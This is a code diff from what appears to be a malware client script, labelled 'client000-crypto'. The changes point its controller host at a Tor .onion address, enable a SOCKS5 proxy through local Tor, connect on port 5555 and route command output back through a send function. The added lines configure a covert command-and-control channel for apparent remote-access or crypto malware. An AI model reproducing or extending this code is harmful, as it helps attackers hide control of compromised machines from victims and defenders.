@@ -97,8 +97,7 @@ class PKCS7Encoder():
         return text[:-pad]
 
 encoder = PKCS7Encoder()
-#host = 'l7sj6c7zqgmuck2d.onion'
-host = '192.168.0.150'
+host = '7fr4kcvird2hu4hj.onion'
 cType = "client000-crypto" #client Type
 
 ############################################################### Virus Total API
@@ -356,7 +355,7 @@ else:
         print("Cert generated")
 
 sock = socks.socksocket()
-#sock.setproxy(socks.PROXY_TYPE_SOCKS5,"127.0.0.1",9050)
+sock.setproxy(socks.PROXY_TYPE_SOCKS5,"127.0.0.1",9050)
 sock.connect((host,5555))
 #ca_certs="certificate.pem"
 
@@ -451,4 +450,4 @@ while 1:
             SendData("Error "+str(err))
     else:
         print '[inText] ' + inText
-        ssl_sock.write(inText)
+        SendData(inText)
